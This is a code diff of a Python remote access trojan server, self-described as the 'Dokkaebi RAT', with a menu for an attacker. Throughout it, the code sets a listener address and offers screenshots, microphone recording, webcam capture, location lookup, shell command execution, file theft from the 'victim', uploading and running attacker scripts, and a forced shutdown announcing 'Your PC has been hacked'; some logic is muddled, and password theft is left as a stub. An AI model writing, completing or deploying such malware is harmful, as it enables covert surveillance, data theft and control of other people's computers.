@@ -1,6 +1,3 @@
-# Dokkaebi RAT Script
-# Created by dokkaebi
-
 import os
 import subprocess
 import shutil
@@ -8,49 +5,38 @@ import pyscreenshot
 import pyaudio
 import wave
 import cv2
-from geopy.geocoders import Nominatim
-from colorama import init, Fore
+import geocoder
 import socket
 import time
-
-# Initialize colorama
-init(autoreset=True)
+import threading
+import signal
 
 # Global variables
-HOST = 'changeme'
-PORT = changeme
+HOST = '192.168.137.1'
+PORT = 1234
 
 # Color codes
-COLOR_GREEN = Fore.GREEN
-COLOR_RED = Fore.RED
-COLOR_CYAN = Fore.CYAN
-COLOR_YELLOW = Fore.YELLOW
+COLOR_GREEN = '\033[92m'
+COLOR_RED = '\033[91m'
+COLOR_CYAN = '\033[96m'
+COLOR_YELLOW = '\033[93m'
 
 # ASCII cat
-CAT_ASCII = r"""
-                     ╱|、
-                  (˚ˎ 。7  
-                   |、˜〵          
-                  じしˍ,)ノ
+CAT_ASCII = """
+⠀ ／l、
+（ﾟ､ ｡ ７
+⠀ l、ﾞ ~ヽ
+  じしf_, )ノ
 """
-
-# Contact for Discord
-CONTACT_DISCORD = "currentlyunknownuser"
 
 def colored_print(msg, color):
     """Print colored message."""
-    print(color + msg)
+    print(color + msg + '\033[0m')
 
 def show_loading_screen():
     """Display loading screen with ASCII art."""
     print(COLOR_YELLOW + CAT_ASCII)
-
-def show_loading_wheel():
-    """Display loading wheel."""
-    while True:
-        for char in "|/-\\":
-            print(f"\r{COLOR_YELLOW}Listening on {HOST}:{PORT} {char}", end="", flush=True)
-            time.sleep(0.1)
+    print(COLOR_CYAN + "Press Ctrl + C to stop the script.")
 
 def take_screenshot():
     """Capture and save a screenshot."""
@@ -60,11 +46,6 @@ def take_screenshot():
         colored_print("Screenshot captured successfully.", COLOR_GREEN)
     except Exception as e:
         colored_print(f"Failed to capture screenshot: {e}", COLOR_RED)
-
-def save_passwords():
-    """Save passwords from browsers."""
-    # Add code to save passwords from browsers here
-    pass
 
 def record_audio():
     """Record audio from the microphone."""
@@ -116,23 +97,17 @@ def capture_camera():
 def get_gps_location():
     """Get GPS location based on IP address."""
     try:
-        geolocator = Nominatim(user_agent="geoapiExercises")
-        location = geolocator.geocode(get_ip_address())
-        colored_print("Latitude and Longitude of the said address:", COLOR_GREEN)
-        colored_print(f"{location.latitude}, {location.longitude}", COLOR_CYAN)
+        g = geocoder.ip('me')
+        if g.ok:
+            latitude, longitude = g.latlng
+            output = f"{latitude}, {longitude}"
+            with open("gps_location.txt", "w") as f:
+                f.write(output)
+            colored_print(output, COLOR_CYAN)
+        else:
+            colored_print("Failed to get GPS location.", COLOR_RED)
     except Exception as e:
         colored_print(f"Failed to get GPS location: {e}", COLOR_RED)
-
-def get_ip_address():
-    """Get local IP address."""
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip_address = s.getsockname()[0]
-        s.close()
-        return ip_address
-    except Exception as e:
-        colored_print(f"Failed to get IP address: {e}", COLOR_RED)
 
 def execute_command():
     """Execute shell command."""
@@ -159,70 +134,149 @@ def transfer_files():
     except Exception as e:
         colored_print(f"Failed to transfer files: {e}", COLOR_RED)
 
-def upload_script():
+def upload_script(file_path):
     """Upload a script to victim's machine."""
     try:
-        # Example: Upload a script named "evil_script.py" to victim's machine
-        shutil.copy('evil_script.py', '/path/to/victim')
+        # Example: Upload a script specified by the attacker to victim's machine
+        shutil.copy(file_path, '/path/to/victim')
         colored_print("Script uploaded successfully.", COLOR_GREEN)
     except Exception as e:
         colored_print(f"Failed to upload script: {e}", COLOR_RED)
 
-def execute_uploaded_script():
+def execute_uploaded_script(script_path):
     """Execute the uploaded script on victim's machine."""
     try:
-        # Example: Execute the uploaded script on victim's machine
-        subprocess.run(['python', 'evil_script.py'])
+        # Example: Execute the uploaded script specified by the attacker on victim's machine
+        subprocess.run(['python', script_path])
         colored_print("Script executed successfully.", COLOR_GREEN)
     except Exception as e:
         colored_print(f"Failed to execute script: {e}", COLOR_RED)
 
-def initiate_shutdown():
-    """Initiate system shutdown."""
+def initiate_shutdown(countdown_time):
+    """Initiate system shutdown with a custom countdown."""
     try:
-        os.system('shutdown /s /t 0')
-        colored_print("System shutdown initiated.", COLOR_GREEN)
+        # Create a .bat file to initiate shutdown with a custom countdown message and time
+        with open("shutdown.bat", "w") as f:
+            f.write(f'@echo off\n')
+            f.write(f'echo Your PC has been hacked By Dokkaebi. Goodnight.\n')
+            f.write(f'echo Countdown {countdown_time}\n')
+            f.write(f'shutdown /s /t {countdown_time}\n')
+        colored_print("Shutdown script created successfully.", COLOR_GREEN)
     except Exception as e:
-        colored_print(f"Failed to initiate shutdown: {e}", COLOR_RED)
+        colored_print(f"Failed to create shutdown script: {e}", COLOR_RED)
 
-def main():
-    """Main function."""
-    show_loading_screen()
-    show_loading_wheel()
+def send_menu_options():
+    """Display menu options for the attacker."""
+    menu_options = (
+        "Menu Options:\n"
+        "1. Take screenshot\n"
+        "   - Capture and save a screenshot.\n"
+        "2. Save passwords\n"
+        "   - Not implemented yet.\n"
+        "3. Record audio\n"
+        "   - Record audio from the microphone.\n"
+        "4. Capture camera\n"
+        "   - Capture an image from the camera.\n"
+        "5. Get GPS location\n"
+        "   - Get GPS location based on IP address.\n"
+        "6. Execute command\n"
+        "   - Execute shell command.\n"
+        "7. Transfer files\n"
+        "   - Transfer files from victim to attacker.\n"
+        "8. Upload script\n"
+        "   - Upload a script to victim's machine.\n"
+        "9. Execute uploaded script\n"
+        "   - Execute the uploaded script on victim's machine.\n"
+        "10. Initiate shutdown [time]\n"
+        "   - Initiate system shutdown with a custom countdown.\n"
+    )
+    print(menu_options)
 
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
-        s.listen()
-        colored_print(f"\nDOKKAEBI RAT Server is listening on {HOST}:{PORT}", COLOR_YELLOW)
-        conn, addr = s.accept()
-        with conn:
-            print(f"Connected to {addr}")
+class RAT_SERVER:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.server = None
+        self.client = None
+
+    def build_connection(self):
+        try:
+            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.server.bind((self.host, self.port))
+            self.server.listen(5)
+            show_loading_screen()  # Display loading screen before waiting for the client
+            print("[*] Waiting for the client...")
+            self.client, addr = self.server.accept()
+            ipcli = self.client.recv(1024).decode()
+            print(f"[*] Connection is established successfully with {ipcli}\n")
+            print("Sending menu options to the attacker...")
+            send_menu_options()  # Display menu options for the attacker after connection is established
+        except Exception as e:
+            print(f"Error building connection: {e}")
+
+    def execute_command(self, command):
+        try:
+            self.client.send(command.encode())
+            result_output = self.client.recv(1024).decode()
+            print(result_output)
+        except Exception as e:
+            print(f"Error executing command: {e}")
+
+    def send_file(self, file_path):
+        try:
+            with open(file_path, 'rb') as f:
+                file_data = f.read()
+                self.client.send(file_data)
+        except Exception as e:
+            print(f"Error sending file: {e}")
+
+    def receive_file(self, save_path):
+        try:
+            file_data = self.client.recv(2147483647)
+            with open(save_path, 'wb') as f:
+                f.write(file_data)
+        except Exception as e:
+            print(f"Error receiving file: {e}")
+
+    def execute(self):
+        try:
             while True:
-                command = conn.recv(1024).decode('utf-8')
-                if not command:
-                    break
-                try:
-                    command = int(command)
-                    if command == 1:
-                        take_screenshot()
-                    elif command == 2:
-                        save_passwords()
-                    elif command == 3:
-                        record_audio()
-                    elif command == 4:
-                        capture_camera()
-                    elif command == 5:
-                        get_gps_location()
-                    elif command == 6:
-                        execute_command()
-                    elif command == 7:
-                        transfer_files()
-                    elif command == 8:
-                        upload_script()
-                    elif command == 9:
-                        execute_uploaded_script()
-                    elif command == 10:
-                        initiate_shutdown()
-                    else:
-                        colored_print("Invalid command.", COLOR_RED)
-                except Exception
+                rat_command = input("Command >> ")
+                if rat_command == '1':
+                    take_screenshot()
+                elif rat_command == '2':
+                    # Save passwords (implement this function)
+                    pass
+                elif rat_command == '3':
+                    record_audio()
+                elif rat_command == '4':
+                    capture_camera()
+                elif rat_command == '5':
+                    get_gps_location()
+                elif rat_command == '6':
+                    execute_command()
+                elif rat_command == '7':
+                    transfer_files()
+                elif rat_command == '8':
+                    file_path = input("Enter the path of the script to upload: ")
+                    upload_script(file_path)
+                elif rat_command == '9':
+                    script_path = input("Enter the name of the script to execute: ")
+                    execute_uploaded_script(script_path)
+                elif rat_command.startswith('10 '):
+                    # Extract countdown time from the command
+                    countdown_time = rat_command.split(' ')[1]
+                    initiate_shutdown(countdown_time)
+                else:
+                    print("Invalid command. Please enter a number from the menu options.")
+        except KeyboardInterrupt:
+            print("\nExiting...")
+            if self.client:
+                self.client.close()
+            if self.server:
+                self.server.close()
+
+if __name__ == "__main__":
+    rat = RAT_SERVER(HOST, PORT)
+    rat.build_connection()
+    rat.execute()
